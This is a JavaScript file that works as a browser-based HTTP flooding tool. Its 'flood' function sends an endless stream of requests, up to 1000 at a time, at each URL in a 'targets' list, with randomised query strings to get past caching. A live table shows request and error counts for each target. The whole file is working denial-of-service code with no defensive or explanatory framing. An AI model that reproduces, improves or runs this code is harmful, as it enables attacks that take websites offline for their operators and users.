const statsEl = document.getElementById('stats');

function printStats () {
    statsEl.innerHTML = '<table width="100%"><thead><tr><th style="text-align:left;">URL</th><th style="text-align:left;">Number of Requests</th><th style="text-align:left;">Number of Errors</th></tr></thead><tbody>' + Object.entries(targets).map(([target, {
        number_of_requests,
        number_of_errored_responses
    }]) => '<tr><td>' + target + '</td><td>' + number_of_requests + '</td><td>' + number_of_errored_responses + '</td></tr>').join('') + '</tbody></table>';
}

setInterval(printStats, 1000);

const CONCURRENCY_LIMIT = 1000;
const queue = [];

async function fetchWithTimeout (resource, options) {
    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), options.timeout);
    return fetch(resource, {
        method: 'GET',
        mode: 'no-cors',
        signal: controller.signal
    }).then((response) => {
        clearTimeout(id);
        return response;
    }).catch((error) => {
        clearTimeout(id);
        throw error;
    });
}

async function flood (target) {
    let rand;
    for (let i = 0; ; ++i) {
        if (queue.length > CONCURRENCY_LIMIT) {
            await queue.shift();
        }
        rand = i % 3 === 0 ? '' : ('?' + Math.random() * 1000);
        queue.push(
            fetchWithTimeout(target + rand, {timeout: 1000})
                .catch((error) => {
                    if (error.code === 20 /* ABORT */) {
                        return;
                    }
                    targets[target].number_of_errored_responses++;
                })
                .then((response) => {
                    if (response && !response.ok) {
                        targets[target].number_of_errored_responses++;
                    }
                    targets[target].number_of_requests++;
                })
        );
    }
}

// Start
if (targets) {
    Object.keys(targets).map(flood);
}
